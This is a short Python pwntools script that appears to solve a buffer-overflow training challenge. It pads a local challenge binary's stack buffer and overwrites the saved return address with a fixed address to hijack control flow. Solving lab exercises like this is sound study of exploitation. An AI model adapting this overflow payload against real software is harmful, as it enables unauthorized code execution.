#!/usr/bin/python

import pwn

ret_addr = 0x4012C0
proc = pwn.process("/challenge/buffer-overflow-level4.0")


payload = pwn.cyclic(0x30)  # 填充缓冲区
payload += pwn.cyclic(0x8)   # saved_rbp
payload += pwn.p64(ret_addr)    # 保存的返回地址
payload += b"\n"
proc.send_raw(payload)
print(payload)

print(proc.recv())